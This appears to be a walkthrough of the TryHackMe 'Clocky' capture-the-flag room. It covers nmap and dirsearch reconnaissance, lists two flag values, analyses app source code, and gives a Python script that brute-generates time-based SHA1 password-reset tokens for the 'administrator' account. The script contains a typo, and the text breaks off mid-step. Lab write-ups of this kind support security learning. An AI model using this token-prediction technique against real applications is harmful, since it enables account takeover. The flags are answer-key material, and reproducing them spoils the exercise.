# <div align="center">[Clocky TryHackMe walkthrough](https://tryhackme.com/room/clocky)</div>
<div align="center">Time is an illusion.</div>
<div align="center">
  <img width="200" height="200" alt="clocky" src="https://github.com/user-attachments/assets/6de5dbc0-add7-45c2-ab71-9bbccab2459d" />
</div>
<div align="center"></div>

## Introduction
<img width="1039" height="315" alt="fb credt" src="https://github.com/user-attachments/assets/2ff5e1bd-0407-4fbe-9593-bd551f19579a" />
<img width="593" height="114" alt="host code" src="https://github.com/user-attachments/assets/4e69c953-c2da-4d01-9897-53bc5fc6bbac" />
<img width="561" height="555" alt="hosted site" src="https://github.com/user-attachments/assets/dbfad241-cd7b-485c-8268-bc446384069f" />
<img width="250" height="297" alt="admin login" src="https://github.com/user-attachments/assets/7a444714-a3c6-4afe-b8de-5e7d3d49b031" />

<img width="302" height="252" alt="image" src="https://github.com/user-attachments/assets/47fa57f3-ea76-4792-b2bd-3c135f0e41fc" />

## Initial Reconnaissance

I started with a basic nmap scan to understand what services were exposed on the target.

```
~$ nmap -sV 10.49.166.98
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-07 19:03 IST
Nmap scan report for 10.49.166.98
Host is up (0.084s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41
8000/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: Host: ip-10-49-166-98.ap-south-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are 3 ports open.

* ssh on port `22`
* http on port `80` with apache 2.4.41
* that shocking another nginx is also running on port `8000` with 1.18.0

## Web Enumeration

I also checked both web services directly in the browser since ports 80 and 8000 were open.

I started with port 80.

<img width="445" height="139" alt="image" src="https://github.com/user-attachments/assets/ed3b6efd-1f1d-4842-9606-3ddf90239d16" />

The Apache service responded with a forbidden page. Nothing useful surfaced there.

Next, I peeked into port 8000.

<img width="247" height="99" alt="image" src="https://github.com/user-attachments/assets/642b06e0-14ea-424d-9dd3-17d391c1e80e" />

Sadly, this one also returned a forbidden response. Both services were accessible but clearly locked down at the surface level.

Since both port 80 and 8000 were serving HTTP, I began with the Apache service on port 80.

```
~$ dirsearch -u 10.49.166.98

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460


Target: http://10.49.166.98/

[19:06:40] Starting: 

Task Completed
```

Nothing interesting showed up on port 80, so I shifted focus to the nginx service running on port 8000.

```
~$ dirsearch -u 10.49.166.98:8000

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460


Target: http://10.49.166.98:8000/

[19:07:06] Starting: 
[19:07:35] 200 -    2KB - /index.zip
[19:07:47] 200 -  115B  - /robots.txt

Task Completed
```

Two endpoints immediately stood out: `/index.zip` and `/robots.txt`.

I checked the robots file first.

```
curl -s http://10.49.166.98:8000/robots.txt
```

### We got our first flag here

```
~$ curl -s http://10.49.166.98:8000/robots.txt
User-agent: *
Disallow: /*.sql$
Disallow: /*.zip$
Disallow: /*.bak$

Flag 1: THM{14b45bb9eefdb584b79063eca6a31b7a}
~$ 
```

Next, I moved on to the zip file exposed on the same port.

```bash
~$ wget http://10.49.166.98:8000/index.zip
~$ unzip index.zip 
Archive:  index.zip
  inflating: app.py                  
 extracting: flag2.txt               
```
## After unzipping, we got our second flag

```
~$ cat flag2.txt
THM{1d3d62de34a3692518d03ec474159eaf}
```

That confirmed the second flag.

as we got app.py Source code analysis and port 8080 exploitation

it returns current date and time of the server.

first while casually inspecting the code I found two username jane and clarice
```
# A new app will be deployed in prod soon
# Implement rate limiting on all endpoints
# Let's just use a WAF...?
# Not done (16/05-2023, jane)
```

Turns out that’s the code for site on port 8080 - we’ve discovered few endpoints

/password_reset
/forgot_password
 and we got database credentials

<img>

At the end of the python file was the port on which this application was run.

<img>


Let see the application hostesd on 8080
<img>

as i check code 

/administrator - admin panel with login form
this is a login portal on “/administrator” which checks if the username and password are correct and if they are then it redirects to “/dashboard” else it returns the Invalid username or password
this is the application hosted on port 8080
as i got to this `http://10.49.166.98:8080/administrator`
<img>
there is admin login page

at `http://10.49.166.98:8080/forgot_password`
<img>
This is the interesting one. We can see that this endpoint has a simple form that takes a username. If the username exists, a special token is generated for this user. We get a message saying “A reset link has been sent to your email” even if the user doesn’t exist, so we can’t enumerate usernames by abusing this. We will come back to this code in a little bit.
This is an interesting one, it generates Sha1 tokens for resetting the password of a user and it is does not include any randomness to generate the token since we can control the time at which the token is generated.
/password_reset

I wrote a script with the help of chatGPT to generate tokens and save in a file.
```
import datetime
import hashlib

IST_OFFSET = datetime.timedelta(hours=5, minutes=30)
USERNAME = "administrator"
OUTPUT_FILE = f"{USERNAME}.txt"

def generate_hashes(username):
    base_time = datetime.datetime.now(datetime.timezone.utc) - IST_OFFSET
    hashes = set()

    for sec insrange(10):
        for ms in range(1000):
            ts = base_time - datetime.timedelta(seconds=sec, milliseconds=ms)
            payload = f"{ts:%Y-%m-%d %H:%M:%S.%f} . {username.upper()}"
            sha1 = hashlib.sha1(payload.encode()).hexdigest()
            hashes.add(sha1)

    return hashes

def save_to_file(filename, hashes):
    with open(filename, "w") as f:
        f.write("\n".join(hashes))

def main():
    hashes = generate_hashes(USERNAME)
    save_to_file(OUTPUT_FILE, hashes)

if __name__ == "__main__":
    main()
```

This endpoint handles the password reset itself. We can see that the token that was generated previously is expected to be passed as a URL parameter called TEMPORARY (which might not be the name in use now). Then, the code checks the database and if the tokens match, a password_reset.html page is rendered.

So, to summarize A user asks for a password reset, and a link is sent to him via email, which probably looks like this:
http://http://10.49.166.98:8080/password_reset?TEMPORARY=<token> . If the tokens match, the page is rendered and the user can reset the password.

Ok so after running script
